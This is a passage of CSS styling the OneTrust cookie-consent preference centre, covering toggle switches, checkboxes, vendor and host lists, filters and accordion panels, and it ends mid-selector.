        #onetrust-pc-sdk .ot-tgl input:focus+.ot-switch {
            outline: #000 solid 1px
        }

        #onetrust-pc-sdk .ot-switch {
            position: relative;
            display: inline-block;
            width: 45px;
            height: 25px
        }

        #onetrust-pc-sdk .ot-switch-nob {
            position: absolute;
            cursor: pointer;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: #f2f1f1;
            border: 1px solid #ddd;
            transition: all .2s ease-in 0s;
            -moz-transition: all .2s ease-in 0s;
            -o-transition: all .2s ease-in 0s;
            -webkit-transition: all .2s ease-in 0s;
            border-radius: 20px
        }

        #onetrust-pc-sdk .ot-switch-nob:before {
            position: absolute;
            content: "";
            height: 21px;
            width: 21px;
            bottom: 1px;
            background-color: #7d7d7d;
            -webkit-transition: .4s;
            transition: .4s;
            border-radius: 20px
        }

        #onetrust-pc-sdk .ot-chkbox input:checked~label::before {
            background-color: #3860be
        }

        #onetrust-pc-sdk .ot-chkbox input+label::after {
            content: none;
            color: #fff
        }

        #onetrust-pc-sdk .ot-chkbox input:checked+label::after {
            content: ""
        }

        #onetrust-pc-sdk .ot-chkbox input:focus+label::before {
            outline-style: solid;
            outline-width: 2px;
            outline-style: auto
        }

        #onetrust-pc-sdk .ot-chkbox label {
            position: relative;
            display: inline-block;
            padding-left: 30px;
            cursor: pointer;
            font-weight: 500
        }

        #onetrust-pc-sdk .ot-chkbox label::before,
        #onetrust-pc-sdk .ot-chkbox label::after {
            position: absolute;
            content: "";
            display: inline-block;
            border-radius: 3px
        }

        #onetrust-pc-sdk .ot-chkbox label::before {
            height: 18px;
            width: 18px;
            border: 1px solid #3860be;
            left: 0px;
            top: auto
        }

        #onetrust-pc-sdk .ot-chkbox label::after {
            height: 5px;
            width: 9px;
            border-left: 3px solid;
            border-bottom: 3px solid;
            transform: rotate(-45deg);
            -o-transform: rotate(-45deg);
            -ms-transform: rotate(-45deg);
            -webkit-transform: rotate(-45deg);
            left: 4px;
            top: 5px
        }

        #onetrust-pc-sdk .ot-label-txt {
            display: none
        }

        #onetrust-pc-sdk .ot-chkbox input,
        #onetrust-pc-sdk .ot-tgl input {
            position: absolute;
            opacity: 0;
            width: 0;
            height: 0
        }

        #onetrust-pc-sdk .ot-arw-cntr {
            float: right;
            position: relative;
            pointer-events: none
        }

        #onetrust-pc-sdk .ot-arw-cntr .ot-arw {
            width: 16px;
            height: 16px;
            margin-left: 5px;
            color: dimgray;
            display: inline-block;
            vertical-align: middle;
            -webkit-transition: all 150ms ease-in 0s;
            -moz-transition: all 150ms ease-in 0s;
            -o-transition: all 150ms ease-in 0s;
            transition: all 150ms ease-in 0s
        }

        #onetrust-pc-sdk input:checked~.ot-acc-hdr .ot-arw,
        #onetrust-pc-sdk button[aria-expanded=true]~.ot-acc-hdr .ot-arw-cntr svg {
            transform: rotate(90deg);
            -o-transform: rotate(90deg);
            -ms-transform: rotate(90deg);
            -webkit-transform: rotate(90deg)
        }

        #onetrust-pc-sdk input[type=checkbox]:focus+.ot-acc-hdr {
            outline: #000 1px solid
        }

        #onetrust-pc-sdk .ot-tgl-cntr,
        #onetrust-pc-sdk .ot-arw-cntr {
            display: inline-block
        }

        #onetrust-pc-sdk .ot-tgl-cntr {
            width: 45px;
            float: right;
            margin-top: 2px
        }

        #onetrust-pc-sdk #ot-lst-cnt .ot-tgl-cntr {
            margin-top: 10px
        }

        #onetrust-pc-sdk .ot-always-active-subgroup {
            width: auto;
            padding-left: 0px !important;
            top: 3px;
            position: relative
        }

        #onetrust-pc-sdk .ot-label-status {
            padding-left: 5px;
            font-size: .75em;
            display: none
        }

        #onetrust-pc-sdk .ot-arw-cntr {
            margin-top: -1px
        }

        #onetrust-pc-sdk .ot-arw-cntr svg {
            -webkit-transition: all 300ms ease-in 0s;
            -moz-transition: all 300ms ease-in 0s;
            -o-transition: all 300ms ease-in 0s;
            transition: all 300ms ease-in 0s;
            height: 10px;
            width: 10px
        }

        #onetrust-pc-sdk input:checked~.ot-acc-hdr .ot-arw {
            transform: rotate(90deg);
            -o-transform: rotate(90deg);
            -ms-transform: rotate(90deg);
            -webkit-transform: rotate(90deg)
        }

        #onetrust-pc-sdk .ot-arw {
            width: 10px;
            margin-left: 15px;
            transition: all 300ms ease-in 0s;
            -webkit-transition: all 300ms ease-in 0s;
            -moz-transition: all 300ms ease-in 0s;
            -o-transition: all 300ms ease-in 0s
        }

        #onetrust-pc-sdk .ot-vlst-cntr {
            margin-bottom: 0
        }

        #onetrust-pc-sdk .ot-hlst-cntr {
            margin-top: 5px;
            display: inline-block;
            width: 100%
        }

        #onetrust-pc-sdk .category-vendors-list-handler,
        #onetrust-pc-sdk .category-vendors-list-handler+a,
        #onetrust-pc-sdk .category-host-list-handler {
            clear: both;
            color: #3860be;
            margin-left: 0;
            font-size: .813em;
            text-decoration: none;
            float: left;
            overflow: hidden
        }

        #onetrust-pc-sdk .category-vendors-list-handler:hover,
        #onetrust-pc-sdk .category-vendors-list-handler+a:hover,
        #onetrust-pc-sdk .category-host-list-handler:hover {
            text-decoration-line: underline
        }

        #onetrust-pc-sdk .category-vendors-list-handler+a {
            clear: none
        }

        #onetrust-pc-sdk .ot-vlst-cntr .ot-ext-lnk,
        #onetrust-pc-sdk .ot-ven-hdr .ot-ext-lnk {
            display: inline-block;
            height: 13px;
            width: 13px;
            background-repeat: no-repeat;
            margin-left: 1px;
            margin-top: 6px;
            cursor: pointer
        }

        #onetrust-pc-sdk .ot-ven-hdr .ot-ext-lnk {
            margin-bottom: -1px
        }

        #onetrust-pc-sdk .back-btn-handler {
            font-size: 1em;
            text-decoration: none
        }

        #onetrust-pc-sdk .back-btn-handler:hover {
            opacity: .6
        }

        #onetrust-pc-sdk #ot-lst-title h3 {
            display: inline-block;
            word-break: break-word;
            word-wrap: break-word;
            margin-bottom: 0;
            color: #656565;
            font-size: 1em;
            font-weight: bold;
            margin-left: 15px
        }

        #onetrust-pc-sdk #ot-lst-title {
            margin: 10px 0 10px 0px;
            font-size: 1em;
            text-align: left
        }

        #onetrust-pc-sdk #ot-pc-hdr {
            margin: 0 0 0 30px;
            height: auto;
            width: auto
        }

        #onetrust-pc-sdk #ot-pc-hdr input::placeholder {
            color: #d4d4d4;
            font-style: italic
        }

        #onetrust-pc-sdk #vendor-search-handler {
            height: 31px;
            width: 100%;
            border-radius: 50px;
            font-size: .8em;
            padding-right: 35px;
            padding-left: 15px;
            float: left;
            margin-left: 15px
        }

        #onetrust-pc-sdk .ot-ven-name {
            display: block;
            width: auto;
            padding-right: 5px
        }

        #onetrust-pc-sdk #ot-lst-cnt {
            overflow-y: auto;
            margin-left: 20px;
            margin-right: 7px;
            width: calc(100% - 27px);
            max-height: calc(100% - 80px);
            height: 100%;
            transform: translate3d(0, 0, 0)
        }

        #onetrust-pc-sdk #ot-pc-lst {
            width: 100%;
            bottom: 100px;
            position: absolute;
            top: 60px
        }

        #onetrust-pc-sdk #ot-pc-lst:not(.ot-enbl-chr) .ot-tgl-cntr .ot-arw-cntr,
        #onetrust-pc-sdk #ot-pc-lst:not(.ot-enbl-chr) .ot-tgl-cntr .ot-arw-cntr * {
            visibility: hidden
        }

        #onetrust-pc-sdk #ot-pc-lst .ot-tgl-cntr {
            right: 12px;
            position: absolute
        }

        #onetrust-pc-sdk #ot-pc-lst .ot-arw-cntr {
            float: right;
            position: relative
        }

        #onetrust-pc-sdk #ot-pc-lst .ot-arw {
            margin-left: 10px
        }

        #onetrust-pc-sdk #ot-pc-lst .ot-acc-hdr {
            overflow: hidden;
            cursor: pointer
        }

        #onetrust-pc-sdk .ot-vlst-cntr {
            overflow: hidden
        }

        #onetrust-pc-sdk #ot-sel-blk {
            overflow: hidden;
            width: 100%;
            position: sticky;
            position: -webkit-sticky;
            top: 0;
            z-index: 3
        }

        #onetrust-pc-sdk #ot-back-arw {
            height: 12px;
            width: 12px
        }

        #onetrust-pc-sdk .ot-lst-subhdr {
            width: 100%;
            display: inline-block
        }

        #onetrust-pc-sdk .ot-search-cntr {
            float: left;
            width: 78%;
            position: relative
        }

        #onetrust-pc-sdk .ot-search-cntr>svg {
            width: 30px;
            height: 30px;
            position: absolute;
            float: left;
            right: -15px
        }

        #onetrust-pc-sdk .ot-fltr-cntr {
            float: right;
            right: 50px;
            position: relative
        }

        #onetrust-pc-sdk #filter-btn-handler {
            background-color: #3860be;
            border-radius: 17px;
            display: inline-block;
            position: relative;
            width: 32px;
            height: 32px;
            -moz-transition: .1s ease;
            -o-transition: .1s ease;
            -webkit-transition: 1s ease;
            transition: .1s ease;
            padding: 0;
            margin: 0
        }

        #onetrust-pc-sdk #filter-btn-handler:hover {
            background-color: #3860be
        }

        #onetrust-pc-sdk #filter-btn-handler svg {
            width: 12px;
            height: 12px;
            margin: 3px 10px 0 10px;
            display: block;
            position: static;
            right: auto;
            top: auto
        }

        #onetrust-pc-sdk .ot-ven-link,
        #onetrust-pc-sdk .ot-ven-legclaim-link {
            color: #3860be;
            text-decoration: none;
            font-weight: 100;
            display: inline-block;
            padding-top: 10px;
            transform: translate(0, 1%);
            -o-transform: translate(0, 1%);
            -ms-transform: translate(0, 1%);
            -webkit-transform: translate(0, 1%);
            position: relative;
            z-index: 2
        }

        #onetrust-pc-sdk .ot-ven-link *,
        #onetrust-pc-sdk .ot-ven-legclaim-link * {
            font-size: inherit
        }

        #onetrust-pc-sdk .ot-ven-link:hover,
        #onetrust-pc-sdk .ot-ven-legclaim-link:hover {
            text-decoration: underline
        }

        #onetrust-pc-sdk .ot-ven-hdr {
            width: calc(100% - 160px);
            height: auto;
            float: left;
            word-break: break-word;
            word-wrap: break-word;
            vertical-align: middle;
            padding-bottom: 3px
        }

        #onetrust-pc-sdk .ot-ven-link,
        #onetrust-pc-sdk .ot-ven-legclaim-link {
            letter-spacing: .03em;
            font-size: .75em;
            font-weight: 400
        }

        #onetrust-pc-sdk .ot-ven-dets {
            border-radius: 2px;
            background-color: #f8f8f8
        }

        #onetrust-pc-sdk .ot-ven-dets li:first-child p:first-child {
            border-top: none
        }

        #onetrust-pc-sdk .ot-ven-dets .ot-ven-disc:not(:first-child) {
            border-top: 1px solid #ddd !important
        }

        #onetrust-pc-sdk .ot-ven-dets .ot-ven-disc:nth-child(n+3) p {
            display: inline-block
        }

        #onetrust-pc-sdk .ot-ven-dets .ot-ven-disc:nth-child(n+3) p:nth-of-type(odd) {
            width: 30%
        }

        #onetrust-pc-sdk .ot-ven-dets .ot-ven-disc:nth-child(n+3) p:nth-of-type(even) {
            width: 50%;
            word-break: break-word;
            word-wrap: break-word
        }

        #onetrust-pc-sdk .ot-ven-dets .ot-ven-disc p,
        #onetrust-pc-sdk .ot-ven-dets .ot-ven-disc h4 {
            padding-top: 5px;
            padding-bottom: 5px;
            display: block
        }

        #onetrust-pc-sdk .ot-ven-dets .ot-ven-disc h4 {
            display: inline-block
        }

        #onetrust-pc-sdk .ot-ven-dets .ot-ven-disc p:nth-last-child(-n+1) {
            padding-bottom: 10px
        }

        #onetrust-pc-sdk .ot-ven-dets .ot-ven-disc p:nth-child(-n+2):not(.disc-pur) {
            padding-top: 10px
        }

        #onetrust-pc-sdk .ot-ven-dets .ot-ven-disc .disc-pur-cont {
            display: inline
        }

        #onetrust-pc-sdk .ot-ven-dets .ot-ven-disc .disc-pur {
            position: relative;
            width: 50% !important;
            word-break: break-word;
            word-wrap: break-word;
            left: calc(30% + 17px)
        }

        #onetrust-pc-sdk .ot-ven-dets .ot-ven-disc .disc-pur:nth-child(-n+1) {
            position: static
        }

        #onetrust-pc-sdk .ot-ven-dets p,
        #onetrust-pc-sdk .ot-ven-dets h4,
        #onetrust-pc-sdk .ot-ven-dets span {
            font-size: .69em;
            text-align: left;
            vertical-align: middle;
            word-break: break-word;
            word-wrap: break-word;
            margin: 0;
            padding-bottom: 10px;
            padding-left: 15px;
            color: #2e3644
        }

        #onetrust-pc-sdk .ot-ven-dets h4 {
            padding-top: 5px
        }

        #onetrust-pc-sdk .ot-ven-dets span {
            color: dimgray;
            padding: 0;
            vertical-align: baseline
        }

        #onetrust-pc-sdk .ot-ven-dets .ot-ven-pur h4 {
            border-top: 1px solid #e9e9e9;
            border-bottom: 1px solid #e9e9e9;
            padding-bottom: 5px;
            margin-bottom: 5px;
            font-weight: bold
        }

        #onetrust-pc-sdk #ot-host-lst .ot-sel-all {
            float: right;
            position: relative;
            margin-right: 42px;
            top: 10px
        }

        #onetrust-pc-sdk #ot-host-lst .ot-sel-all input[type=checkbox] {
            width: auto;
            height: auto
        }

        #onetrust-pc-sdk #ot-host-lst .ot-sel-all label {
            height: 20px;
            width: 20px;
            padding-left: 0px
        }

        #onetrust-pc-sdk #ot-host-lst .ot-acc-txt {
            overflow: hidden;
            width: 95%
        }

        #onetrust-pc-sdk .ot-host-hdr {
            position: relative;
            z-index: 1;
            pointer-events: none;
            width: calc(100% - 125px);
            float: left
        }

        #onetrust-pc-sdk .ot-host-name,
        #onetrust-pc-sdk .ot-host-desc {
            display: inline-block;
            width: 90%
        }

        #onetrust-pc-sdk .ot-host-name {
            pointer-events: none
        }

        #onetrust-pc-sdk .ot-host-hdr>a {
            text-decoration: underline;
            font-size: .82em;
            position: relative;
            z-index: 2;
            float: left;
            margin-bottom: 5px;
            pointer-events: initial
        }

        #onetrust-pc-sdk .ot-host-name+a {
            margin-top: 5px
        }

        #onetrust-pc-sdk .ot-host-name,
        #onetrust-pc-sdk .ot-host-name a,
        #onetrust-pc-sdk .ot-host-desc,
        #onetrust-pc-sdk .ot-host-info {
            color: dimgray;
            word-break: break-word;
            word-wrap: break-word
        }

        #onetrust-pc-sdk .ot-host-name,
        #onetrust-pc-sdk .ot-host-name a {
            font-weight: bold;
            font-size: .82em;
            line-height: 1.3
        }

        #onetrust-pc-sdk .ot-host-name a {
            font-size: 1em
        }

        #onetrust-pc-sdk .ot-host-expand {
            margin-top: 3px;
            margin-bottom: 3px;
            clear: both;
            display: block;
            color: #3860be;
            font-size: .72em;
            font-weight: normal
        }

        #onetrust-pc-sdk .ot-host-expand * {
            font-size: inherit
        }

        #onetrust-pc-sdk .ot-host-desc,
        #onetrust-pc-sdk .ot-host-info {
            font-size: .688em;
            line-height: 1.4;
            font-weight: normal
        }

        #onetrust-pc-sdk .ot-host-desc {
            margin-top: 10px
        }

        #onetrust-pc-sdk .ot-host-opt {
            margin: 0;
            font-size: inherit;
            display: inline-block;
            width: 100%
        }

        #onetrust-pc-sdk .ot-host-opt li>div div {
            font-size: .8em;
            padding: 5px 0
        }

        #onetrust-pc-sdk .ot-host-opt li>div div:nth-child(1) {
            width: 30%;
            float: left
        }

        #onetrust-pc-sdk .ot-host-opt li>div div:nth-child(2) {
            width: 70%;
            float: left;
            word-break: break-word;
            word-wrap: break-word
        }

        #onetrust-pc-sdk .ot-host-info {
            border: none;
            display: inline-block;
            width: calc(100% - 10px);
            padding: 10px;
            margin-bottom: 10px;
            background-color: #f8f8f8
        }

        #onetrust-pc-sdk .ot-host-info>div {
            overflow: auto
        }

        #onetrust-pc-sdk #no-results {
            text-align: center;
            margin-top: 30px
        }

        #onetrust-pc-sdk #no-results p {
            font-size: 1em;
            color: #2e3644;
            word-break: break-word;
            word-wrap: break-word
        }

        #onetrust-pc-sdk #no-results p span {
            font-weight: bold
        }

        #onetrust-pc-sdk #ot-fltr-modal {
            width: 100%;
            height: auto;
            display: none;
            -moz-transition: .2s ease;
            -o-transition: .2s ease;
            -webkit-transition: 2s ease;
            transition: .2s ease;
            overflow: hidden;
            opacity: 1;
            right: 0
        }

        #onetrust-pc-sdk #ot-fltr-modal .ot-label-txt {
            display: inline-block;
            font-size: .85em;
            color: dimgray
        }

        #onetrust-pc-sdk #ot-fltr-cnt {
            z-index: 2147483646;
            background-color: #fff;
            position: absolute;
            height: 90%;
            max-height: 300px;
            width: 325px;
            left: 210px;
            margin-top: 10px;
            margin-bottom: 20px;
            padding-right: 10px;
            border-radius: 3px;
            -webkit-box-shadow: 0px 0px 12px 2px #c7c5c7;
            -moz-box-shadow: 0px 0px 12px 2px #c7c5c7;
            box-shadow: 0px 0px 12px 2px #c7c5c7
        }

        #onetrust-pc-sdk .ot-fltr-scrlcnt {
            overflow-y: auto;
            overflow-x: hidden;
            clear: both;
            max-height: calc(100% - 60px)
        }

        #onetrust-pc-sdk #ot-anchor {
            border: 12px solid rgba(0, 0, 0, 0);
            display: none;
            position: absolute;
            z-index: 2147483647;
            right: 55px;
            top: 75px;
            transform: rotate(45deg);
            -o-transform: rotate(45deg);
            -ms-transform: rotate(45deg);
            -webkit-transform: rotate(45deg);
            background-color: #fff;
            -webkit-box-shadow: -3px -3px 5px -2px #c7c5c7;
            -moz-box-shadow: -3px -3px 5px -2px #c7c5c7;
            box-shadow: -3px -3px 5px -2px #c7c5c7
        }

        #onetrust-pc-sdk .ot-fltr-btns {
            margin-left: 15px
        }

        #onetrust-pc-sdk #filter-apply-handler {
            margin-right: 15px
        }

        #onetrust-pc-sdk .ot-fltr-opt {
            margin-bottom: 25px;
            margin-left: 15px;
            width: 75%;
            position: relative
        }

        #onetrust-pc-sdk .ot-fltr-opt p {
            display: inline-block;
            margin: 0;
            font-size: .9em;
            color: #2e3644
        }

        #onetrust-pc-sdk .ot-chkbox label span {
            font-size: .85em;
            color: dimgray
        }

        #onetrust-pc-sdk .ot-chkbox input[type=checkbox]+label::after {
            content: none;
            color: #fff
        }

        #onetrust-pc-sdk .ot-chkbox input[type=checkbox]:checked+label::after {
            content: ""
        }

        #onetrust-pc-sdk .ot-chkbox input[type=checkbox]:focus+label::before {
            outline-style: solid;
            outline-width: 2px;
            outline-style: auto
        }

        #onetrust-pc-sdk #ot-selall-vencntr,
        #onetrust-pc-sdk #ot-selall-adtlvencntr,
        #onetrust-pc-sdk #ot-selall-hostcntr,
        #onetrust-pc-sdk #ot-selall-licntr,
        #onetrust-pc-sdk #ot-selall-gnvencntr {
            right: 15px;
            position: relative;
            width: 20px;
            height: 20px;
            float: right
        }

        #onetrust-pc-sdk #ot-selall-vencntr label,
        #onetrust-pc-sdk #ot-selall-adtlvencntr label,
        #onetrust-pc-sdk #ot-selall-hostcntr label,
        #onetrust-pc-sdk #ot-selall-licntr label,
        #onetrust-pc-sdk #ot-selall-gnvencntr label {
            float: left;
            padding-left: 0
        }

        #onetrust-pc-sdk #ot-ven-lst:first-child {
            border-top: 1px solid #e2e2e2
        }

        #onetrust-pc-sdk ul {
            list-style: none;
            padding: 0
        }

        #onetrust-pc-sdk ul li {
            position: relative;
            margin: 0;
            padding: 15px 15px 15px 10px;
            border-bottom: 1px solid #e2e2e2
        }

        #onetrust-pc-sdk ul li h3 {
            font-size: .75em;
            color: #656565;
            margin: 0;
            display: inline-block;
            width: 70%;
            height: auto;
            word-break: break-word;
            word-wrap: break-word
        }

        #onetrust-pc-sdk ul li p {
            margin: 0;
            font-size: .7em
        }

        #onetrust-pc-sdk ul li input[type=checkbox] {
            position: absolute;
            cursor: pointer;
            width: 100%;
            height: 100%;
            opacity: 0;
            margin: 0;
            top: 0;
            left: 0
        }

        #onetrust-pc-sdk .ot-cat-item>button:focus,
        #onetrust-pc-sdk .ot-acc-cntr>button:focus,
        #onetrust-pc-sdk li>button:focus {
            outline: #000 solid 2px
        }

        #onetrust-pc-sdk .ot-cat-item>button,
        #onetrust-pc-sdk .ot-acc-cntr>button,
        #onetrust-pc-sdk li>button {
            position: absolute;
            cursor: pointer;
            width: 100%;
            height: 100%;
            margin: 0;
            top: 0;
            left: 0;
            z-index: 1;
            max-width: none;
            border: none
        }

        #onetrust-pc-sdk .ot-cat-item>button[aria-expanded=false]~.ot-acc-txt,
        #onetrust-pc-sdk .ot-acc-cntr>button[aria-expanded=false]~.ot-acc-txt,
        #onetrust-pc-sdk li>button[aria-expanded=false]~.ot-acc-txt {
            margin-top: 0;
            max-height: 0;
            opacity: 0;
            overflow: hidden;
            width: 100%;
            transition: .25s ease-out;
            display: none
        }

        #onetrust-pc-sdk .ot-cat-item>button[aria-expanded=true]~.ot-acc-txt,
        #onetrust-pc-sdk .ot-acc-cntr>button[aria-expanded=true]~.ot-acc-txt,
        #onetrust-pc-sdk li>button[aria-expanded=true]~.ot-acc-txt {
            transition: .1s ease-in;
            margin-top: 10px;
            width: 100%;
            overflow: auto;
            display: block
        }

        #onetrust-pc-sdk .ot-cat-item>button[aria-expanded=true]~.ot-acc-grpcntr,
        #onetrust-pc-sdk .ot-acc-cntr>button[aria-expanded=true]~.ot-acc-grpcntr,
        #onetrust-pc-sdk li>button[aria-expanded=true]~.ot-acc-grpcntr {
            width: auto;
            margin-top: 0px;
            padding-bottom: 10px
        }

        #onetrust-pc-sdk .ot-host-item>button:focus,
        #onetrust-pc-sdk .ot-ven-item>button:focus {
            outline: 0;
            border: 2px solid #000
        }

        #onetrust-pc-sdk .ot-hide-acc>button {
            pointer-events: none
        }

        #onetrust-pc-sdk .ot-hide-acc .ot-plus-minus>*,
        #onetrust-pc-sdk .ot-hide-acc .ot-arw-cntr>* {
            visibility: hidden
        }

        #onetrust-pc-sdk .ot-hide-acc .ot-acc-hdr {
            min-height: 30px
        }

        #onetrust-pc-sdk.ot-addtl-vendors #ot-lst-cnt:not(.ot-host-cnt) {
            padding-right: 10px;
            width: calc(100% - 37px);
            margin-top: 10px;
            max-height: calc(100% - 90px)
        }

        #onetrust-pc-sdk.ot-addtl-vendors #ot-lst-cnt:not(.ot-host-cnt) #ot-sel-blk {
            background-color: #f9f9fc;
            border: 1px solid #e2e2e2;
            width: calc(100% - 2px);
            padding-bottom: 5px;
            padding-top: 5px
        }

        #onetrust-pc-sdk.ot-addtl-vendors #ot-lst-cnt:not(.ot-host-cnt) #ot-sel-blk.ot-vnd-list-cnt {
            border: unset;
            background-color: unset
        }

        #onetrust-pc-sdk.ot-addtl-vendors #ot-lst-cnt:not(.ot-host-cnt) #ot-sel-blk.ot-vnd-list-cnt .ot-sel-all-hdr {
            display: none
        }

        #onetrust-pc-sdk.ot-addtl-vendors #ot-lst-cnt:not(.ot-host-cnt) #ot-sel-blk.ot-vnd-list-cnt .ot-sel-all {
            padding-right: .5rem
        }

        #onetrust-pc-sdk.ot-addtl-vendors #ot-lst-cnt:not(.ot-host-cnt) #ot-sel-blk.ot-vnd-list-cnt .ot-sel-all .ot-chkbox {
            right: 0
        }

        #onetrust-pc-sdk.ot-addtl-vendors #ot-lst-cnt:not(.ot-host-cnt) .ot-sel-all {
            padding-right: 34px
        }

        #onetrust-pc-sdk.ot-addtl-vendors #ot-lst-cnt:not(.ot-host-cnt) .ot-sel-all-chkbox {
            width: auto
        }

        #onetrust-pc-sdk.ot-addtl-vendors #ot-lst-cnt:not(.ot-host-cnt) ul li {
            border: 1px solid #e2e2e2;
            margin-bottom: 10px
        }

        #onetrust-pc-sdk.ot-addtl-vendors #ot-lst-cnt:not(.ot-host-cnt) .ot-acc-cntr>.ot-acc-hdr {
            padding: 10px 0 10px 15px
        }

        #onetrust-pc-sdk.ot-addtl-vendors .ot-sel-all-chkbox {
            float: right
        }

        #onetrust-pc-sdk.ot-addtl-vendors .ot-plus-minus~.ot-sel-all-chkbox {
            right: 34px
        }

        #onetrust-pc-sdk.ot-addtl-vendors #ot-ven-lst:first-child {
            border-top: none
        }

        #onetrust-pc-sdk .ot-acc-cntr {
            position: relative;
            border-left: 1px solid #e2e2e2;
            border-right: 1px solid #e2e2e2;
            border-bottom: 1px solid #e2e2e2
        }

        #onetrust-pc-sdk .ot-acc-cntr input {
            z-index: 1
        }

        #onetrust-pc-sdk .ot-acc-cntr>.ot-acc-hdr {
            background-color: #f9f9fc;
            padding: 5px 0 5px 15px;
            width: auto
        }

        #onetrust-pc-sdk .ot-acc-cntr>.ot-acc-hdr .ot-plus-minus {
            vertical-align: middle;
            top: auto
        }

        #onetrust-pc-sdk .ot-acc-cntr>.ot-acc-hdr .ot-arw-cntr {
            right: 10px
        }

        #onetrust-pc-sdk .ot-acc-cntr>.ot-acc-hdr input {
            z-index: 2
        }

        #onetrust-pc-sdk .ot-acc-cntr.ot-add-tech .ot-acc-hdr {
            padding: 10px 0 10px 15px
        }

        #onetrust-pc-sdk .ot-acc-cntr>input[type=checkbox]:checked~.ot-acc-hdr {
            border-bottom: 1px solid #e2e2e2
        }

        #onetrust-pc-sdk .ot-acc-cntr>.ot-acc-txt {
            padding-left: 10px;
            padding-right: 10px
        }

        #onetrust-pc-sdk .ot-acc-cntr button[aria-expanded=true]~.ot-acc-txt {
            width: auto
        }

        #onetrust-pc-sdk .ot-acc-cntr .ot-addtl-venbox {
            display: none
        }

        #onetrust-pc-sdk .ot-vlst-cntr {
            margin-bottom: 0;
            width: 100%
        }

        #onetrust-pc-sdk .ot-vensec-title {
            font-size: .813em;
            vertical-align: middle;
            display: inline-block
        }

        #onetrust-pc-sdk .category-vendors-list-handler,
        #onetrust-pc-sdk .category-vendors-list-handler+a {
            margin-left: 0;
            margin-top: 10px
        }

        #onetrust-pc-sdk #ot-selall-vencntr.line-through label::after,
        #onetrust-pc-sdk #ot-selall-adtlvencntr.line-through label::after,
        #onetrust-pc-sdk #ot-selall-licntr.line-through label::after,
        #onetrust-pc-sdk #ot-selall-hostcntr.line-through label::after,
        #onetrust-pc-sdk #ot-selall-gnvencntr.line-through label::after {
            height: auto;
            border-left: 0;
            transform: none;
            -o-transform: none;
            -ms-transform: none;
            -webkit-transform: none;
            left: 5px;
            top: 9px
        }

        #onetrust-pc-sdk #ot-category-title {
            float: left;
            padding-bottom: 10px;
            font-size: 1em;
            width: 100%
        }

        #onetrust-pc-sdk .ot-cat-grp {
            margin-top: 10px
        }

        #onetrust-pc-sdk .ot-cat-item {
            line-height: 1.1;
            margin-top: 10px;
            display: inline-block;
            width: 100%
        }

        #onetrust-pc-sdk .ot-btn-container {
            text-align: right
        }

        #onetrust-pc-sdk .ot-btn-container button {
            display: inline-block;
            font-size: .75em;
            letter-spacing: .08em;
            margin-top: 19px
        }

        #onetrust-pc-sdk #close-pc-btn-handler.ot-close-icon {
            position: absolute;
            top: 10px;
            right: 0;
            z-index: 1;
            padding: 0;
            background-color: rgba(0, 0, 0, 0);
            border: none
        }

        #onetrust-pc-sdk #close-pc-btn-handler.ot-close-icon svg {
            display: block;
            height: 10px;
            width: 10px
        }

        #onetrust-pc-sdk #clear-filters-handler {
            margin-top: 20px;
            margin-bottom: 10px;
            float: right;
            max-width: 200px;
            text-decoration: none;
            color: #3860be;
            font-size: .9em;
            font-weight: bold;
            background-color: rgba(0, 0, 0, 0);
            border-color: rgba(0, 0, 0, 0);
            padding: 1px
        }

        #onetrust-pc-sdk #clear-filters-handler:hover {
            color: #2285f7
        }

        #onetrust-pc-sdk #clear-filters-handler:focus {
            outline: #000 solid 1px
        }

        #onetrust-pc-sdk .ot-enbl-chr h4~.ot-tgl,
        #onetrust-pc-sdk .ot-enbl-chr h4~.ot-always-active {
            right: 45px
        }

        #onetrust-pc-sdk .ot-enbl-chr h4~.ot-tgl+.ot-tgl {
            right: 120px
        }

        #onetrust-pc-sdk .ot-enbl-chr .ot-pli-hdr.ot-leg-border-color span:first-child {
            width: 90px
        }

        #onetrust-pc-sdk .ot-enbl-chr li.ot-subgrp>h5+.ot-tgl-cntr {
            padding-right: 25px
        }

        #onetrust-pc-sdk .ot-plus-minus {
            width: 20px;
            height: 20px;
            font-size: 1.5em;
            position: relative;
            display: inline-block;
            margin-right: 5px;
            top: 3px
        }

        #onetrust-pc-sdk .ot-plus-minus span {
            position: absolute;
            background: #27455c;
            border-radius: 1px
        }

        #onetrust-pc-sdk .ot-plus-minus span:first-of-type {
            top: 25%;
            bottom: 25%;
            width: 10%;
            left: 45%
        }

        #onetrust-pc-sdk .ot-plus-minus span:last-of-type {
            left: 25%;
            right: 25%;
            height: 10%;
            top: 45%
        }

        #onetrust-pc-sdk button[aria-expanded=true]~.ot-acc-hdr .ot-arw,
        #onetrust-pc-sdk button[aria-expanded=true]~.ot-acc-hdr .ot-plus-minus span:first-of-type,
        #onetrust-pc-sdk button[aria-expanded=true]~.ot-acc-hdr .ot-plus-minus span:last-of-type {
            transform: rotate(90deg)
        }

        #onetrust-pc-sdk button[aria-expanded=true]~.ot-acc-hdr .ot-plus-minus span:last-of-type {
            left: 50%;
            right: 50%
        }

        #onetrust-pc-sdk #ot-selall-vencntr label,
        #onetrust-pc-sdk #ot-selall-adtlvencntr label,
        #onetrust-pc-sdk #ot-selall-hostcntr label,
        #onetrust-pc-sdk #ot-selall-licntr label {
            position: relative;
            display: inline-block;
            width: 20px;
            height: 20px
        }

        #onetrust-pc-sdk .ot-host-item .ot-plus-minus,
        #onetrust-pc-sdk .ot-ven-item .ot-plus-minus {
            float: left;
            margin-right: 8px;
            top: 10px
        }

        #onetrust-pc-sdk .ot-ven-item ul {
            list-style: none inside;
            font-size: 100%;
            margin: 0
        }

        #onetrust-pc-sdk .ot-ven-item ul li {
            margin: 0 !important;
            padding: 0;
            border: none !important
        }

        #onetrust-pc-sdk .ot-pli-hdr {
            color: #77808e;
            overflow: hidden;
            padding-top: 7.5px;
            padding-bottom: 7.5px;
            width: calc(100% - 2px);
            border-top-left-radius: 3px;
            border-top-right-radius: 3px
        }

        #onetrust-pc-sdk .ot-pli-hdr span:first-child {
            top: 50%;
            transform: translateY(50%);
            max-width: 90px
        }

        #onetrust-pc-sdk .ot-pli-hdr span:last-child {
            padding-right: 10px;
            max-width: 95px;
            text-align: center
        }

        #onetrust-pc-sdk .ot-li-title {
            float: right;
            font-size: .813em
        }

        #onetrust-pc-sdk .ot-pli-hdr.ot-leg-border-color {
            background-color: #f4f4f4;
            border: 1px solid #d8d8d8
        }

        #onetrust-pc-sdk .ot-pli-hdr.ot-leg-border-color span:first-child {
            text-align: left;
            width: 70px
        }

        #onetrust-pc-sdk li.ot-subgrp>h5,
